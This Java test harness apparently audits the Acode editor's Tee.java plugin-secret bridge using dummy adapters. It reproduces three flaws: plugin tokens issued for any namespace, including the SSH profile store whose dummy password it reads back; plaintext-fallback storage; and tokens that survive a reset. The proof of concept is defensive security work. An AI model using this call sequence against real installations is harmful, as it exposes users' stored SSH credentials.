import android.content.Context;
import com.foxdebug.acode.rk.auth.EncryptedPreferenceManager;
import com.foxdebug.acode.rk.plugin.Tee;
import org.apache.cordova.CallbackContext;
import org.apache.cordova.CordovaWebView;
import org.json.JSONArray;

/**
 * Characterize defects in the actual Tee.java source using dummy Android,
 * Cordova, and preference storage adapters. Successful assertions mean the
 * listed vulnerabilities were reproduced; they are not a security pass.
 */
public class TeeAudit {
    private static CallbackContext call(Tee tee, String action, Object... args)
            throws Exception {
        CallbackContext callback = new CallbackContext();
        if (!tee.execute(action, new JSONArray(args), callback)) {
            throw new AssertionError("Unexpected action: " + action);
        }
        return callback;
    }

    private static void check(boolean condition, String message) {
        if (!condition) throw new AssertionError(message);
    }

    public static void main(String[] args) throws Exception {
        Tee tee = new Tee();
        tee.initialize(Context::new, new CordovaWebView() {});
        String session = (String) call(tee, "establishConnection").value;

        CallbackContext invalid = call(tee, "requestToken", "wrong-session", "example", "{}");
        check("INVALID_SESSION".equals(invalid.error), "Native session control changed");
        System.out.println("CONTROL: invalid session rejected by actual Tee.java");

        String profileStore = "acode_sftp_profiles_v1";
        String dummyProfile = "{\"password\":\"dummy-only\",\"hostname\":\"example.invalid\"}";
        new EncryptedPreferenceManager(new Context(), profileStore, false)
                .setString("profile-dummy", dummyProfile);
        // The JS audit separately demonstrates interception of this session.
        String token = (String) call(tee, "requestToken", session, profileStore, "{}").value;
        check(token != null, "Expected arbitrary namespace token to be issued");
        CallbackContext read = call(tee, "get_secret", token, "profile-dummy", "");
        check(dummyProfile.equals(read.value), "Expected reserved profile namespace read");
        check(profileStore.equals(EncryptedPreferenceManager.lastNamespace),
                "Expected actual Tee.java to select the SSH profile namespace");
        System.out.println("VULNERABILITY: arbitrary plugin ID selects SSH profile preference namespace");

        check(EncryptedPreferenceManager.lastAllowPlaintextFallback,
                "Expected tablet Tee.java to request fallback-enabled storage");
        System.out.println("VULNERABILITY: plugin secret accessor requests plaintext fallback");

        tee.onReset();
        check(tee.isTokenValid(token, profileStore), "Expected old plugin token to survive reset");
        check(dummyProfile.equals(call(tee, "get_secret", token, "profile-dummy", "").value),
                "Expected old token to keep accessing the selected store after reset");
        System.out.println("VULNERABILITY: issued plugin token remains usable after onReset");
        System.out.println("4 native audit checks completed (1 control, 3 vulnerability characterizations)");
    }
}
